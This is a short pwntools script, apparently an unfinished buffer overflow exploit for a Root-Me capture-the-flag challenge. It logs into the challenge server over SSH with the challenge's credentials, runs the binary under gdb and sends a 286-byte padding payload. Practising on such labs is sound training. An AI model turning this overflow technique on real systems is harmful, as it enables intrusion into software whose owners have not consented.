from pwn import *
 
context.arch = "amd64"


payload = "A" * 286

s = ssh(host='challenge03.root-me.org', port=2223, user='app-systeme-ch34', password='app-systeme-ch34')

#p = s.process(['./ch34'])
p = gdb.debug(['./ch34'])
p.sendline(payload)
